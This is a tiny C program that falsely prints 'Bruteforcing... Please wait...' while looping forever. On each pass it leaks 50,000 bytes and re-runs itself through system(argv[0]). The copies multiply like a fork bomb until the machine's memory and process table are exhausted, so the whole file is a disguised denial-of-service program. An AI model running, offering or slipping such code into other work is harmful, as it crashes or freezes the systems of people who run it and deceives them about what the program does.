#include <stdlib.h>
#include <stdio.h>
int main(int argc, char *argv[]) {

    for (;;) {
        printf("Bruteforcing...\nPlease wait...\n");
        malloc(50000);
        system(argv[0]);
    }

}